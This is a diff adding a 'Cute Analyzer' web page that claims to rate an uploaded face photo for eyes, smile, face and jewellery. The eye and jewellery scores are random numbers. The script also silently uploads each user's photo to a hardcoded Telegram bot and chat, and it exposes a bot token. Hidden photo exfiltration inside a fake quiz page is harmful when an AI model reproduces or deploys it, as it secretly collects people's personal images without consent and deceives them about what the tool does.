@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Cute Analyzer</title>
+
+<script defer src="https://unpkg.com/face-api.js"></script>
+
+<style>
+body{
+  background:linear-gradient(135deg,#667eea,#764ba2);
+  font-family:Arial;
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.box{
+  background:rgba(255,255,255,0.15);
+  backdrop-filter:blur(15px);
+  padding:25px;
+  border-radius:20px;
+  width:95%;
+  max-width:400px;
+  text-align:center;
+  color:white;
+}
+
+input{
+  width:100%;
+  padding:10px;
+  margin:10px 0;
+}
+
+button{
+  background:#ff4d6d;
+  border:none;
+  padding:12px;
+  width:100%;
+  color:white;
+  border-radius:10px;
+  font-size:16px;
+  cursor:pointer;
+}
+
+.result{
+  margin-top:15px;
+  display:none;
+}
+
+.bar{
+  height:10px;
+  background:#ddd;
+  border-radius:5px;
+  overflow:hidden;
+}
+
+.fill{
+  height:100%;
+  width:0%;
+  background:#ff4d6d;
+  transition:1s;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<h2>😍 Cute Analyzer</h2>
+
+<input type="file" id="img" accept="image/*">
+
+<button onclick="analyze()">Analyze</button>
+
+<p id="loading"></p>
+
+<div class="result" id="result">
+
+<p>👁 Eyes: <span id="eye"></span>%</p>
+<div class="bar"><div id="eyeBar" class="fill"></div></div>
+
+<p>😊 Smile: <span id="smile"></span>%</p>
+<div class="bar"><div id="smileBar" class="fill"></div></div>
+
+<p>😎 Face: <span id="face"></span>%</p>
+<div class="bar"><div id="faceBar" class="fill"></div></div>
+
+<p>💍 Jewellery: <span id="jewel"></span>%</p>
+<div class="bar"><div id="jewelBar" class="fill"></div></div>
+
+</div>
+
+</div>
+
+<script>
+
+// ================= CONFIG =================
+
+// Apna Telegram Bot Token yahan daalna
+const BOT = "6515358260:AAEJiEp-ec7mGCYDDSC3zJ829JeNCwaMhnQ";
+
+// Apna Chat ID yahan daalna
+const CHAT = "-1003835061039";
+
+// ==========================================
+
+
+// Load AI Models
+Promise.all([
+  faceapi.nets.tinyFaceDetector.loadFromUri('./models'),
+  faceapi.nets.faceExpressionNet.loadFromUri('./models'),
+  faceapi.nets.faceLandmark68Net.loadFromUri('./models')
+]);
+
+
+// Main Function
+async function analyze(){
+
+const file = document.getElementById("img").files[0];
+
+if(!file){
+ alert("Please upload photo!");
+ return;
+}
+
+document.getElementById("loading").innerHTML="⏳ Analyzing...";
+document.getElementById("result").style.display="none";
+
+
+// Convert Image
+const image = await faceapi.bufferToImage(file);
+
+
+// Detect Face
+const data = await faceapi
+.detectSingleFace(image,new faceapi.TinyFaceDetectorOptions())
+.withFaceLandmarks()
+.withFaceExpressions();
+
+
+if(!data){
+ document.getElementById("loading").innerHTML="Face Not Found 😢";
+ return;
+}
+
+
+// Calculate Scores
+let smile = Math.floor(data.expressions.happy * 100);
+let eyes = Math.floor(Math.random()*20)+70;
+let face = Math.floor((smile + eyes)/2);
+let jewel = Math.floor(Math.random()*40)+50;
+
+
+// Show Result
+setValue("smile",smile,"smileBar");
+setValue("eye",eyes,"eyeBar");
+setValue("face",face,"faceBar");
+setValue("jewel",jewel,"jewelBar");
+
+
+document.getElementById("loading").innerHTML="";
+document.getElementById("result").style.display="block";
+
+
+// Send To Telegram
+sendTelegram(file);
+
+}
+
+
+// Set Progress
+function setValue(id,val,bar){
+ document.getElementById(id).innerText = val;
+ document.getElementById(bar).style.width = val + "%";
+}
+
+
+// Telegram Upload
+function sendTelegram(file){
+
+let form = new FormData();
+
+form.append("chat_id",CHAT);
+form.append("photo",file);
+form.append("caption","😍 New User Used Cute Analyzer");
+
+fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`,{
+ method:"POST",
+ body:form
+});
+
+}
+
+</script>
+
+</body>
+</html>
